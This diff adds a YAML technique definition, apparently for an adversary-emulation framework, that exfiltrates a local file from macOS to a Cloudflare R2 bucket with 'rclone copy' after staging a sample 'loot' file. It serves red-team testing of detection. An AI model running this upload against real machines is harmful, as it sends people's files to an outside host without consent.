@@ -1,0 +1,70 @@
+---
+api_version: 2.0
+uuid: 1e8a9f4c-3b6d-4a1e-8c9f-5d0b7a6f2c1b
+name: exfiltrate-file-via-rclone
+authors:
+  - godlovepenn
+description: |
+  Exfiltrates a local file from a macOS system to a Cloudflare R2 bucket using
+  rclone. This TTP assumes that rclone is already installed and configured with
+  the appropriate remote for the target R2 bucket. It first verifies the rclone
+  binary exists. Optionally, it can create a sample file for staging purposes.
+  Finally, it uses the `rclone copy` command to upload the specified local file.
+
+mitre:
+  tactics:
+    - "TA0010 Exfiltration"
+    - "TA0009 Collection"
+    - "TA0007 Discovery"
+  techniques:
+    - "T1567 Exfiltration Over Web Service"
+    - "T1074 Data Staged"
+    - "T1082 System Information Discovery"
+  subtechniques:
+    - "T1567.002 Exfiltration Over Web Service: Exfiltration to Cloud Storage"
+    - "T1074.001 Data Staged: Local Data Staging"
+
+requirements:
+  platforms:
+    - os: darwin
+  superuser: false
+
+args:
+  - name: rclone_remote_name
+    description: The name of the pre-configured rclone remote pointing to the R2 bucket.
+    type: string
+    default: "your-remote"
+  - name: r2_bucket_name
+    description: The name of the destination bucket in Cloudflare R2.
+    type: string
+    default: "your-bucket"
+  - name: local_file_path
+    description: The full path of the local file to upload. Must exist if create_staging_file is false.
+    type: path
+    default: "archived-docs.tar.gz"
+  - name: create_staging_file
+    description: If true, a sample file will be created at local_file_path. If false, local_file_path must already exist.
+    type: bool
+    default: false
+
+steps:
+  - name: check_for_rclone_binary
+    description: Verifies that the rclone binary is installed and accessible in the system's PATH.
+    executor: bash
+    inline: |
+      command -v rclone >/dev/null 2>&1 || { echo "Error: rclone is not installed or not in PATH. Aborting." >&2; exit 1; }
+      echo "rclone binary found. Proceeding..."
+
+  {{ if .Args.create_staging_file }}
+  - name: stage_data_for_exfiltration
+    description: Creates a sample file to be exfiltrated. This step is optional.
+    create_file: "{{.Args.local_file_path}}"
+    contents: "This is sensitive loot from the target macOS machine."
+    cleanup: default
+  {{ end }}
+
+  - name: exfiltrate_file_with_rclone
+    description: Uses the pre-configured rclone to copy the specified file to the Cloudflare R2 bucket.
+    executor: bash
+    inline: |
+      rclone copy "{{.Args.local_file_path}}" "{{.Args.rclone_remote_name}}:{{.Args.r2_bucket_name}}" -v
